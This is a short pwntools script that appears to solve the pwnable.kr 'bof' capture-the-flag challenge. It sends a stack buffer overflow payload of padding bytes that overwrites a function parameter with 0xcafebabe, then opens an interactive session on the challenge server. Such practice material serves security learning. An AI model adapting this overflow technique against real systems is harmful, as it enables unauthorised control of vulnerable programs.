from pwn import *

conn = remote('pwnable.kr', 9000)

payload = b''

# fill the buffer
payload += b'A' * 32

# overwrite the canary
payload += b'B' * 4

# overwrite the canary offset
payload += b'C' * 4

# overwrite the return addr
payload += b'D' * 8

# overwrite the space between
payload += b'E' * 4

# overwrite the parameter
payload += p32(0xcafebabe)

# print(payload)

conn.sendline(payload)

conn.interactive()